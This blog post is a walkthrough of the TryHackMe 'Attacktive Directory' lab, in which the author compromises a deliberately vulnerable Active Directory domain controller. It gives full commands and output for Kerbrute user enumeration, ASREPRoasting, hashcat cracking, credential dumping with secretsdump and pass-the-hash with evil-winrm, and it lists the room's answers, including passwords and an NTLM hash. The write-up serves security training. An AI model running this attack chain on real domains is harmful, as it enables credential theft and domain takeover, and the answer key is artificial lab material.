---
title: "Tryhackme Attacktive Directory Writeup"
description: "Let's see how to deal with active directory"
date:  2024-10-09
categories: [Writeup]
tags: [tryhackme , Active Directory , Active , Directory , attactive Directory.] 
image :
    path : https://i.imghippo.com/files/K60g01728483362.webp
---


Let's see how to solve `Active Directory` vulnerable machine from Tryhackme . We have given steps to solve this machine from specfic vulnerability to exploit and how to use tools with respect to those vulnerabilities ...

**Prerqusitics** :- <span style="color :orange">Impacket , Bloohound, neo4j and evil-winrm</span>


## <span style="color :orange"><b># Installing Impacket</b></span>

Installing Impacket on Kali Linux (2019.3 or 2021.1) can be challenging. Follow these steps if you're setting it up on your own VM, as the AttackBox already has it installed. Ensure you use Python version 3.7 or higher.

#### <span style="color: PaleGreen;">- Commands to Install Impacket</span>

1. **Clone the Impacket Repository:**
   ```bash
   git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
   ```

2. **Install Python Requirements:**
   ```bash
   pip3 install -r /opt/impacket/requirements.txt
   ```

3. **Run the Setup Script:**
   ```bash
   cd /opt/impacket/ && python3 ./setup.py install
   ```

#### - <span style="color: PaleGreen;">Alternative Commands (if issues persist)</span>
```bash
sudo git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
sudo pip3 install -r /opt/impacket/requirements.txt
cd /opt/impacket/ 
sudo pip3 install .
sudo python3 setup.py install
```

## <span style="color: orange;"><b># Installing Bloodhound and Neo4j</b></span>

Bloodhound is another tool used for attacking Active Directory. Install it along with Neo4j using the following command:

#### <span style="color: PaleGreen;">- Command to Install Bloodhound and Neo4j</span>
```bash
apt install bloodhound neo4j
```

## <span style="color: orange;"><b># Troubleshooting</b></span>

If you encounter issues while installing Bloodhound and Neo4j, try updating your system:

### - <span style="color: PaleGreen;">Command to Update System></span>
```bash
apt update && apt upgrade
```

For any Impacket-related issues, reach out to the TryHackMe Discord for assistance.


As always , let's start with the nmap ..

```shell
nmap -sC -sV -p- --min-rate=1000 -oN scan_results 10.10.84.169
```

```shell
Nmap scan report for 10.10.84.169
Host is up (0.40s latency).
Not shown: 65508 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-09 04:18:10Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2024-10-09T04:19:15+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2024-10-08T04:10:03
|_Not valid after:  2025-04-09T04:10:03
|_ssl-date: 2024-10-09T04:19:23+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49672/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
49825/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-10-09T04:19:12
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Oct  9 09:49:35 2024 -- 1 IP address (1 host up) scanned in 165.65 seconds
```

- as we previously have metioned that we have to follow the steps given in the room , so we don't have to enumerate all the ports , you can do experiment for further exploitation .....

## <span style="color: orange;"><b># Enumerating Users via Kerberos</b></span> 

We can use the tool like Kerbrute to enumeratare username and password , this exploit the key authentication system like **[Kerberos](https://github.com/ropnop/kerbrute/releases)** , this tool brute force the discovery of users and password and even do password spray , but it is **NOT** recommended to brute force credentials due to account lockout policies that we cannot enumerate on the domain controller .

```shell
chmod +x kerbrute           # give executable permissiona after downloading
./kerbrute -h        # help menu 
```

For user enumeration we can use the list provided in the room to brute force the user account . 

```shell
./kerbrute_linux_amd64 userenum -d spookysec.local --dc 10.10.155.146 user.txt -o scan-results.txt
```
Note :- add 10.10.84.169 as spookysec.local in the `/etc/hosts` file brfore running above command 

<span style="color: pink;">username enumeration results :</span>

```shell
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/09/24 - Ronnie Flathers @ropnop

2024/10/09 17:06:55 >  Using KDC(s):
2024/10/09 17:06:55 >  	10.10.155.146:88

2024/10/09 17:06:56 >  [+] VALID USERNAME:	 james@spookysec.local
2024/10/09 17:07:03 >  [+] VALID USERNAME:	 svc-admin@spookysec.local
2024/10/09 17:07:12 >  [+] VALID USERNAME:	 James@spookysec.local
2024/10/09 17:07:15 >  [+] VALID USERNAME:	 robin@spookysec.local
2024/10/09 17:07:50 >  [+] VALID USERNAME:	 darkstar@spookysec.local
2024/10/09 17:08:11 >  [+] VALID USERNAME:	 administrator@spookysec.local
2024/10/09 17:08:55 >  [+] VALID USERNAME:	 backup@spookysec.local
2024/10/09 17:09:15 >  [+] VALID USERNAME:	 paradox@spookysec.local
2024/10/09 17:11:27 >  [+] VALID USERNAME:	 JAMES@spookysec.local
2024/10/09 17:12:12 >  [+] VALID USERNAME:	 Robin@spookysec.local
2024/10/09 17:16:37 >  [+] VALID USERNAME:	 Administrator@spookysec.local
```

- Save these in the username.txt file as we will use them later ...


> Question : What command within kerbrute will allow us to enumerate valid username ? <br>
Answer : userenum  [ you can do kerberos --help ]

> Question : What notable account is discovered ? ( These should jump out at you ) <br>
Answer : svc-admin 

> Question : What is the other notable account is discovered ? ( These should jump out at you ) <br>
Answer : backup


## <span style="color: orange;"><b># Abusing Kerberos</b></span>

#### <span style="color: PaleGreen;">- Overview of ASREPRoasting</span>

After enumerating user accounts, we can exploit a Kerberos feature through an attack method known as ASREPRoasting. This attack targets user accounts that have the "Does not require Pre-Authentication" privilege, allowing them to request a Kerberos Ticket without providing valid identification.

#### <span style="color: PaleGreen;">- Retrieving Kerberos Tickets</span>

To identify ASReproastable accounts, we can use Impacket's tool called GetNPUsers.py, located at impacket/examples/GetNPUsers.py. This tool queries the Key Distribution Center for accounts that can be exploited. To use it, a valid set of usernames is required, which can be obtained through previous enumeration with Kerbrute.

```shell
impacket-GetNPUsers  spookysec.local/svc-admin -no-pass 
```
```shell
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for svc-admin
/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:835bcf320ebcdb16d52c5dbaab03be53$797d447da68f06f0399fc8593ea446bf9f0064376bd72a22a5286991966f22c5b35fd257032ed634c49327a6f4359533db9ba624055fea6ba1f4d12a530d35164e0df06fb7b336bb6539c1fa49ece8b672e1199da3ef1611609aeda38889fb2cb8958e2897a00907743b4f54ec11d141ea59bbd57945410fc7ba9e019be735ca2806b36d63a1367f6f4ea38e46e1039296ff3ccd58b963b5123860508047cbe2f0dce949d8325e2f388c770cc056fc2091cca4be5197cd4353c4919cb7e9b06241ca3dd3d3821072ca5f176050a04b13e0e05034832da00ad8ecb40d039d8a04e7f9f798adbdafefdecaf2e924d6cad03a3a
```
#### <span style="color: PaleGreen;">- Let's Crack the Hash</span>

When looking searching the first bit of the hash we found

![image](https://i.imghippo.com/files/4tViZ1728486479.png)

let's use the hashcat to crack

```shell
hashcat -m 18200 ~/Downloads/hash.txt ~/Downloads/passwordlist.txt
```

```shell
Dictionary cache built:
* Filename..: password.txt
* Passwords.: 70188
* Bytes.....: 569236
* Keyspace..: 70188
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:835bcf320ebcdb16d52c5dbaab03be53$797d447da68f06f0399fc8593ea446bf9f0064376bd72a22a5286991966f22c5b35fd257032ed634c49327a6f4359533db9ba624055fea6ba1f4d12a530d35164e0df06fb7b336bb6539c1fa49ece8b672e1199da3ef1611609aeda38889fb2cb8958e2897a00907743b4f54ec11d141ea59bbd57945410fc7ba9e019be735ca2806b36d63a1367f6f4ea38e46e1039296ff3ccd58b963b5123860508047cbe2f0dce949d8325e2f388c770cc056fc2091cca4be5197cd4353c4919cb7e9b06241ca3dd3d3821072ca5f176050a04b13e0e05034832da00ad8ecb40d039d8a04e7f9f798adbdafefdecaf2e924d6cad03a3a:management2005
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:835bcf320eb...d03a3a
Time.Started.....: Wed Oct  9 18:37:25 2024 (0 secs)
Time.Estimated...: Wed Oct  9 18:37:25 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (password.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 19582.9 kH/s (1.05ms) @ Accel:1024 Loops:1 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 70188/70188 (100.00%)
Rejected.........: 0/70188 (0.00%)
Restore.Point....: 0/70188 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: m123456 -> pinkk
Hardware.Mon.#1..: Temp: 42c Util: 11% Core:1500MHz Mem:5500MHz Bus:8

Started: Wed Oct  9 18:37:17 2024
Stopped: Wed Oct  9 18:37:26 2024
```
<br>
> **Questions** : We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password ? <br>
> Answer : svc-admin 

> **Question** : Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name) <br>
Answer: Kerberos 5 AS-REP etype 23

> **Question** : What mode is the hash ? <br>
Answer : 18200

> **Question** : Now crack the hash with the modified password list provided, what is the user accounts password? <br>
Answer : management2005

## <span style="color: orange;"><b># Back to the Basics</b></span>

With a user's account credentials we now have significantly more access within the domain. We can now attempt to enumerate any shares that the domain controller may be giving out. To this we can use the smbclient tool :

```shell
smbclient -L \\\\10.10.230.172\\ -U 'svc-admin' -P 'management2005'
```
- pass the password we got cracked earlier 

```shell
Password for [WORKGROUP\svc-admin]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backup          Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
```

- we can login to get the shell on smb using this command :

```shell
smbclient '\\spookysec.local\backup' -U svc-admin
```
When we log in, we will see a file named backup credentials.txt.



```shell
Password for [WORKGROUP\svc-admin]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Apr  5 00:38:39 2020
  ..                                  D        0  Sun Apr  5 00:38:39 2020
  backup_credentials.txt              A       48  Sun Apr  5 00:38:53 2020
n   
		8247551 blocks of size 4096. 3649885 blocks available
smb: \> mget backup_credentials.txt 
Get file backup_credentials.txt? y
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> exit
```

- it got the base64 encoded credentials , we can decrypt with the in build kali tool ...

```shell
$ cat backup_credentials.txt 
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw 
$ echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d                                          
backup@spookysec.local:backup2517860 
```

## <span style="color: orange;"><b># Elevating Privileges within the Domain</b></span>

According to the creator, the backup account has a special privilege that enables any changes made in Active Directory to be synchronized with this user account. Hashes of passwords are part of this. To dump password hashes, we'll use `secretsdump.py`, one of the impacket utilities.

```shell
python3 secretsdump.py --help  # you can find information about method allowed to dump NTD.DIT
```
Let’s dump the hash of the adminstrator account as this has the highest privileges. We can dump all hashes but that will be overkill. Type in the following command

```shell
python3 secretsdump.py spookysec.local/backup:FOUNDPASSWORDHERE@spookysec.local -just-dc-user Administrator
```
```shell
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
[*] Cleaning up... 
```

we can use the tool `evil-winrm` top perform the pass-the-hash account , in this attacks with don't have to use the password to authenticate with the system to get the shell , we can use the hash to get the shell .. 

```shell
# installing evil-winrm in the kali linux 
$ sudo apt install evil-winrm
```
command to to perform pass-the-hash attack usingevil-winrm

```shell
evil-winrm -i MACHINE_IP -u Administrator -H THEFOUNDHASH
```

- after getting shell you can extract the flag from the respective user desktop directory 

> Administrator : root.txt <br>
> svc-admin : user.txt.txt <br>
> backup : PrivEsc.txt <br>

> **Question** : What method allowed us to dump NTDS.DIT ? <br>
Answer : DRUSAPI

> **Question** : What is the Administrators NTLM hash ? <br>
Answer : 0e0363213e37b94221497260b0bcb4fc

> **Question** : What method of attack could allow us to authenticate as the user without the password ? <br>
Answer : Pass The Hash

> **Question** : Using a tool called Evil-WinRM what option will allow us to use a hash ? <br>
Answer : -H 

<br>

-------------------------------

<br>

### <span style="color: DarkSalmon;"><b># Final Thoughts</b></span>
<br>
I hope this space continues to be helpful in your learning journey!. If you find this blog helpful, I’d love to hear your thoughts—my inbox is always open for feedback. Please excuse any typos, and feel free to point them out so I can correct them. Thanks for understanding and happy learning!. You can contact me on
[Linkedin](https://www.linkedin.com/in/hitesh-sharma-413862245) and [Twitter](https://twitter.com/archtrmntor)


{: .nolineno }





